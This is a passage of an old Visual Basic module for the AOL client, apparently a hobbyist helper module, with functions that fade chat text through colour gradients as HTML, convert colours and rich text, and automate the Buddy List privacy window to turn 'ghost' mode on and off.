        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part8
    textlen% = Len(part8$)
    For i = 1 To textlen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B9 - B8) / textlen% * i) + B8, ((G9 - G8) / textlen% * i) + G8, ((R9 - R8) / textlen% * i) + R8)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part9
    textlen% = Len(part9$)
    For i = 1 To textlen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B10 - B9) / textlen% * i) + B9, ((G10 - G9) / textlen% * i) + G9, ((R10 - R9) / textlen% * i) + R9)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded9$ = Faded9$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeTenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function


Function InverseColor(OldColor)

dacolor$ = RGBtoHEX(OldColor)
RedX% = Val("&H" + Right(dacolor$, 2))
GreenX% = Val("&H" + Mid(dacolor$, 3, 2))
BlueX% = Val("&H" + Left(dacolor$, 2))
newred% = 255 - RedX%
newgreen% = 255 - GreenX%
newblue% = 255 - BlueX%
InverseColor = RGB(newred%, newgreen%, newblue%)

End Function

Function MultiFade(NumColors%, TheColors(), TheText$, Wavy As Boolean)

Dim WaveState%
Dim WaveHTML$
WaveState = 0

If NumColors < 1 Then
MsgBox "Error: Attempting to fade less than one color."
MultiFade = TheText
Exit Function
End If

If NumColors = 1 Then
Blah$ = RGBtoHEX(TheColors(1))
redpart% = Val("&H" + Right(Blah$, 2))
greenpart% = Val("&H" + Mid(Blah$, 3, 2))
bluepart% = Val("&H" + Left(Blah$, 2))
blah2 = RGB(bluepart%, greenpart%, redpart%)
blah3$ = RGBtoHEX(blah2)

MultiFade = "<Font Color=#" + blah3$ + ">" + TheText
Exit Function
End If

Dim RedList%()
Dim GreenList%()
Dim BlueList%()
Dim DaColors$()
Dim DaLens%()
Dim DaParts$()
Dim Faded$()

ReDim RedList%(NumColors)
ReDim GreenList%(NumColors)
ReDim BlueList%(NumColors)
ReDim DaColors$(NumColors)
ReDim DaLens%(NumColors - 1)
ReDim DaParts$(NumColors - 1)
ReDim Faded$(NumColors - 1)

For q% = 1 To NumColors
DaColors(q%) = RGBtoHEX(TheColors(q%))
Next q%

For W% = 1 To NumColors
RedList(W%) = Val("&H" + Right(DaColors(W%), 2))
GreenList(W%) = Val("&H" + Mid(DaColors(W%), 3, 2))
BlueList(W%) = Val("&H" + Left(DaColors(W%), 2))
Next W%

textlen% = Len(TheText)
Do: DoEvents
For f% = 1 To (NumColors - 1)
DaLens(f%) = DaLens(f%) + 1: textlen% = textlen% - 1
If textlen% < 1 Then Exit For
Next f%
Loop Until textlen% < 1
    
DaParts(1) = Left(TheText, DaLens(1))
DaParts(NumColors - 1) = Right(TheText, DaLens(NumColors - 1))
    
dastart% = DaLens(1) + 1

If NumColors > 2 Then
For E% = 2 To NumColors - 2
DaParts(E%) = Mid(TheText, dastart%, DaLens(E%))
dastart% = dastart% + DaLens(E%)
Next E%
End If

For r% = 1 To (NumColors - 1)
textlen% = Len(DaParts(r%))
For i = 1 To textlen%
    TextDone$ = Left(DaParts(r%), i)
    LastChr$ = Right(TextDone$, 1)
    ColorX = RGB(((BlueList(r% + 1) - BlueList(r%)) / textlen% * i) + BlueList(r%), ((GreenList%(r% + 1) - GreenList(r%)) / textlen% * i) + GreenList(r%), ((RedList(r% + 1) - RedList(r%)) / textlen% * i) + RedList(r%))
    colorx2 = RGBtoHEX(ColorX)
        
    If Wavy = True Then
    WaveState = WaveState + 1
    If WaveState > 4 Then WaveState = 1
    If WaveState = 1 Then WaveHTML = "<sup>"
    If WaveState = 2 Then WaveHTML = "</sup>"
    If WaveState = 3 Then WaveHTML = "<sub>"
    If WaveState = 4 Then WaveHTML = "</sub>"
    Else
    WaveHTML = ""
    End If
        
    Faded(r%) = Faded(r%) + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
Next i
Next r%

For qwe% = 1 To (NumColors - 1)
FadedTxtX$ = FadedTxtX$ + Faded(qwe%)
Next qwe%

MultiFade = FadedTxtX$

End Function

Function Replacer(TheStr As String, This As String, WithThis As String)

Dim STRwo13s As String
STRwo13s = TheStr
Do While InStr(1, STRwo13s, This)
DoEvents
thepos% = InStr(1, STRwo13s, This)
STRwo13s = Left(STRwo13s, (thepos% - 1)) + WithThis + Right(STRwo13s, Len(STRwo13s) - (thepos% + Len(This) - 1))
Loop

Replacer = STRwo13s
End Function
Sub FadePreview(PicB As PictureBox, ByVal FadedText As String)
'by aDRaMoLEk
FadedText$ = Replacer(FadedText$, Chr(13), "+chr13+")
OSM = PicB.ScaleMode
PicB.ScaleMode = 3
TextOffX = 0: TextOffY = 0
StartX = 2: StartY = 0
PicB.Font = "Arial": PicB.FontSize = 10
PicB.FontBold = False: PicB.FontItalic = False: PicB.FontUnderline = False: PicB.FontStrikethru = False
PicB.AutoRedraw = True: PicB.ForeColor = 0&: PicB.Cls
For X = 1 To Len(FadedText$)
  C$ = Mid$(FadedText$, X, 1)
  If C$ = "<" Then
    tagstart = X + 1
    tagend = InStr(X + 1, FadedText$, ">") - 1
    T$ = LCase$(Mid$(FadedText$, tagstart, (tagend - tagstart) + 1))
    X = tagend + 1
    Select Case T$
      Case "u"
        PicB.FontUnderline = True
      Case "/u"
        PicB.FontUnderline = False
      Case "s"
        PicB.FontStrikethru = True
      Case "/s"
        PicB.FontStrikethru = False
      Case "b"    'start bold
        PicB.FontBold = True
      Case "/b"   'stop bold
        PicB.FontBold = False
      Case "i"    'start italic
        PicB.FontItalic = True
      Case "/i"   'stop italic
        PicB.FontItalic = False
      Case "sup"  'start superscript
        TextOffY = -1
      Case "/sup" 'end superscript
        TextOffY = 0
      Case "sub"  'start subscript
        TextOffY = 1
      Case "/sub" 'end subscript
        TextOffY = 0
      Case Else
        If Left$(T$, 10) = "font color" Then 'change font color
          ColorStart = InStr(T$, "#")
          ColorString$ = Mid$(T$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          PicB.ForeColor = RGB(RV, GV, BV)
        End If
        If Left$(T$, 9) = "font face" Then 'added by monk-e-god
            fontstart% = InStr(T$, Chr(34))
            dafont$ = Right(T$, Len(T$) - fontstart%)
            PicB.Font = dafont$
        End If
    End Select
  Else  'normal text
    If C$ = "+" And Mid(FadedText$, X, 7) = "+chr13+" Then ' added by monk-e-god
        StartY = StartY + 16
        TextOffX = 0
        X = X + 6
    Else
        PicB.CurrentY = StartY + TextOffY
        PicB.CurrentX = StartX + TextOffX
        PicB.Print C$
        TextOffX = TextOffX + PicB.TextWidth(C$)
    End If
  End If
Next X
PicB.ScaleMode = OSM
End Sub
Function Hex2Dec!(ByVal strHex$)
'by aDRaMoLEk
  If Len(strHex$) > 8 Then strHex$ = Right$(strHex$, 8)
  Hex2Dec = 0
  For X = Len(strHex$) To 1 Step -1
    CurCharVal = GETVAL(Mid$(UCase$(strHex$), X, 1))
    Hex2Dec = Hex2Dec + CurCharVal * 16 ^ (Len(strHex$) - X)
  Next X
End Function
Function GETVAL%(ByVal strLetter$)
'by aDRaMoLEk
  Select Case strLetter$
    Case "0"
      GETVAL = 0
    Case "1"
      GETVAL = 1
    Case "2"
      GETVAL = 2
    Case "3"
      GETVAL = 3
    Case "4"
      GETVAL = 4
    Case "5"
      GETVAL = 5
    Case "6"
      GETVAL = 6
    Case "7"
      GETVAL = 7
    Case "8"
      GETVAL = 8
    Case "9"
      GETVAL = 9
    Case "A"
      GETVAL = 10
    Case "B"
      GETVAL = 11
    Case "C"
      GETVAL = 12
    Case "D"
      GETVAL = 13
    Case "E"
      GETVAL = 14
    Case "F"
      GETVAL = 15
        End Select
End Function
Function Rich2HTML(RichTXT As Control, StartPos%, EndPos%)

Dim Bolded As Boolean
Dim Undered As Boolean
Dim Striked As Boolean
Dim Italiced As Boolean
Dim LastCRL As Long
Dim LastFont As String
Dim HTMLString As String

For posi% = StartPos To EndPos
RichTXT.SelStart = posi%
RichTXT.SelLength = 1

If Bolded <> RichTXT.SelBold Or posi% = StartPos Then
If RichTXT.SelBold = True Then
HTMLString = HTMLString + "<b>"
Bolded = True
Else
HTMLString = HTMLString + "</b>"
Bolded = False
End If
End If

If Undered <> RichTXT.SelUnderline Or posi% = StartPos Then
If RichTXT.SelUnderline = True Then
HTMLString = HTMLString + "<u>"
Undered = True
Else
HTMLString = HTMLString + "</u>"
Undered = False
End If
End If

If Striked <> RichTXT.SelStrikeThru Or posi% = StartPos Then
If RichTXT.SelStrikeThru = True Then
HTMLString = HTMLString + "<s>"
Striked = True
Else
HTMLString = HTMLString + "</s>"
Striked = False
End If
End If

If Italiced <> RichTXT.SelItalic Or posi% = StartPos Then
If RichTXT.SelItalic = True Then
HTMLString = HTMLString + "<i>"
Italiced = True
Else
HTMLString = HTMLString + "</i>"
Italiced = False
End If
End If

If LastCRL <> RichTXT.SelColor Or posi% = StartPos Then
ColorX = RGB(GetRGB(RichTXT.SelColor).Blue, GetRGB(RichTXT.SelColor).Green, GetRGB(RichTXT.SelColor).Red)
colorhex = RGBtoHEX(ColorX)
HTMLString = HTMLString + "<Font Color=#" & colorhex & ">"
LastCRL = RichTXT.SelColor
End If

If LastFont <> RichTXT.SelFontName Then
HTMLString = HTMLString + "<font face=" + Chr(34) + RichTXT.SelFontName + Chr(34) + ">"
LastFont = RichTXT.SelFontName
End If

HTMLString = HTMLString + RichTXT.SelText
Next posi%

Rich2HTML = HTMLString

End Function
Function GetRGB(ByVal CVal As Long)
  GetRGB.Blue = Int(CVal / 65536)
  GetRGB.Green = Int((CVal - (65536 * GetRGB.Blue)) / 256)
  GetRGB.Red = CVal - (65536 * GetRGB.Blue + 256 * GetRGB.Green)
End Function
Function HTMLtoRGB(TheHTML$)

'converts HTML such as 0000FF to an
'RGB value like &HFF0000 so you can
'use it in the FadeByColor functions
If Left(TheHTML$, 1) = "#" Then TheHTML$ = Right(TheHTML$, 6)

RedX$ = Left(TheHTML$, 2)
GreenX$ = Mid(TheHTML$, 3, 2)
BlueX$ = Right(TheHTML$, 2)
rgbhex$ = "&H00" + BlueX$ + GreenX$ + RedX$ + "&"
HTMLtoRGB = Val(rgbhex$)
End Function
Function FadeFourColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, TheText$, Wavy As Boolean)

    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Right(TheText, thrdlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFourColor = Faded1$ + Faded2$ + Faded3$
End Function

Function FadeThreeColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, TheText$, Wavy As Boolean)

    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(TheText)
    fstlen% = (Int(textlen%) / 2)
    part1$ = Left(TheText, fstlen%)
    part2$ = Right(TheText, textlen% - fstlen%)
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    
    FadeThreeColor = Faded1$ + Faded2$
End Function

Function FadeTwoColor(R1%, G1%, B1%, R2%, G2%, B2%, TheText$, Wavy As Boolean)

    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen$ = Len(TheText)
    For i = 1 To textlen$
        TextDone$ = Left(TheText, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / textlen$ * i) + B1, ((G2 - G1) / textlen$ * i) + G1, ((R2 - R1) / textlen$ * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded$ = Faded$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    FadeTwoColor = Faded$
End Function
Sub Ghost_Start()
Dim CloseBuddy As Boolean, AOL As Long, MDI As Long
Dim Buddy As Long, SetupButton As Long, PPWin As Long
Dim BlockAll As Long, PPButton As Long, BuddySetup As Long
Dim SaveButton As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
If Buddy& = 0 Then
    CloseBuddy = True
    Keyword ("BuddyView")
    Do: DoEvents
        Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
    Loop Until Buddy& <> 0
End If
Do: DoEvents
    SetupButton& = FindWindowEx(Buddy&, 0&, "_AOL_Icon", vbNullString)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
Loop Until SetupButton& <> 0
Click (SetupButton&)
Do: DoEvents
    BuddySetup& = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Buddy Lists")
Loop Until BuddySetup& <> 0
PPButton& = FindWindowEx(BuddySetup&, 0&, "_AOL_Icon", vbNullString)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
Click (PPButton&)
Do: DoEvents
    PPWin& = FindWindowEx(MDI&, 0&, vbNullString, "Privacy Preferences")
Loop Until PPWin& <> 0
Do: DoEvents
    SaveButton& = FindWindowEx(PPWin&, 0&, "_AOL_Icon", vbNullString)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
Loop Until SaveButton& <> 0
Do: DoEvents
    BlockAll& = FindWindowEx(PPWin&, 0&, "_AOL_Checkbox", vbNullString)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
Loop Until BlockAll& <> 0
Click (BlockAll&)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
Click (BlockAll&)
Click (SaveButton&)
waitforok
Call SendMessage(BuddySetup&, WM_CLOSE, 0, 0)
If CloseBuddy = True Then Call SendMessage(Buddy&, WM_CLOSE, 0, 0)
End Sub
Sub Ghost_Stop()
Dim CloseBuddy As Boolean, AOL As Long, MDI As Long
Dim Buddy As Long, SetupButton As Long, PPWin As Long
Dim BlockAll As Long, PPButton As Long, BuddySetup As Long
Dim SaveButton As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
If Buddy& = 0 Then
    CloseBuddy = True
    Keyword ("BuddyView")
    Do: DoEvents
        Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
    Loop Until Buddy& <> 0
End If
Do: DoEvents
    SetupButton& = FindWindowEx(Buddy&, 0&, "_AOL_Icon", vbNullString)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
    SetupButton& = GetWindow(SetupButton&, GW_HWNDNEXT)
Loop Until SetupButton& <> 0
Click (SetupButton&)
Do: DoEvents
    BuddySetup& = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Buddy Lists")
Loop Until BuddySetup& <> 0
PPButton& = FindWindowEx(BuddySetup&, 0&, "_AOL_Icon", vbNullString)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
PPButton& = GetWindow(PPButton&, GW_HWNDNEXT)
Click (PPButton&)
Do: DoEvents
    PPWin& = FindWindowEx(MDI&, 0&, "Privacy Preferences", vbNullString)
Loop Until PPWin& <> 0
Do: DoEvents
    SaveButton& = FindWindowEx(PPWin&, 0&, "_AOL_Icon", vbNullString)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
    SaveButton& = GetWindow(SaveButton&, GW_HWNDNEXT)
Loop Until SaveButton& <> 0
Do: DoEvents
    BlockAll& = FindWindowEx(PPWin&, 0&, "_AOL_Checkbox", vbNullString)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
    BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
Loop Until BlockAll& <> 0
Click (BlockAll&)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
BlockAll& = GetWindow(BlockAll&, GW_HWNDNEXT)
Click (BlockAll&)
Click (SaveButton&)
waitforok
Call SendMessage(BuddySetup&, WM_CLOSE, 0, 0)
If CloseBuddy = True Then Call SendMessage(Buddy&, WM_CLOSE, 0, 0)
End Sub
Public Sub WaitForOKOrChatRoom(Room As String)
    Dim RoomTitle As String, FullWindow As Long, FullButton As Long
    Room$ = LCase(ReplaceText(Room$, " ", ""))
    Do
        DoEvents
        RoomTitle$ = GetCaption(FindRoom)
        RoomTitle$ = LCase(ReplaceText(Room$, " ", ""))
        FullWindow& = FindWindow("#32770", "America Online")
        FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
    Loop Until (FullWindow& <> 0& And FullButton& <> 0&) Or Room$ = RoomTitle$
    DoEvents
    If FullWindow& <> 0& Then
        Do
            DoEvents
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
